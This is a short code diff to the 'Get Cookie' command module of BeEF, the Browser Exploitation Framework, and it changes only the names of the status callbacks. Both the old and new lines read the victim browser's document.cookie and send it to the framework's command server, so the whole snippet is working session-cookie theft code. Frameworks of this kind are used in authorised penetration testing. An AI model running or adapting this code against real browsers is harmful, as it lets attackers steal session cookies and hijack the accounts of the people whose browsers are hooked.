@@ -5,10 +5,10 @@
 //
 beef.execute(function() {
 try {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_success());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.status.success());
       beef.debug("[Get Cookie] Cookie captured: "+document.cookie);
 }catch(e){
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.status.error());
       beef.debug("[Get Cookie] Error");
 }
 });
